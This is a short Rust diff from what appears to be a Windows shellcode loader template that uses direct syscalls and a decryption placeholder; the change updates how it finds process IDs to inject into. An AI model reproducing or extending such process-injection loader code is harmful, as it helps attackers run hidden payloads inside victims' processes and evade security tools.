@@ -1,7 +1,7 @@
 #![windows_subsystem = "windows"]
 #![allow(non_snake_case)]
 
-use sysinfo::{PidExt, ProcessExt, System, SystemExt};
+use sysinfo::{System};
 use std::include_bytes;
 use rust_syscalls::syscall;
 
@@ -28,14 +28,21 @@ use winapi::shared::ntdef::NULL;
 {{DECRYPTION_FUNCTION}}
 
 fn boxboxbox(tar: &str) -> Vec<usize> {
-    // search for processes to inject into
-    let mut dom: Vec<usize> = Vec::new();
-    let s = System::new_all();
-    for pro in s.processes_by_exact_name(tar) {
-        //println!("{} {}", pro.pid(), pro.name());
-        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+    // Search for processes to inject into
+    let mut dom = Vec::new();
+    let mut s = System::new_all();
+
+    // Refresh the list of processes
+    s.refresh_all();
+
+    // Iterate over all processes
+    for (pid, pro) in s.processes() {
+        // Check if the process name matches the target
+        if pro.name() == tar {
+            dom.push(usize::from(*pid));
+        }
     }
-    return dom;
+    dom
 }
 
 fn enhance(mut buf: Vec<u8>, tar: usize) {
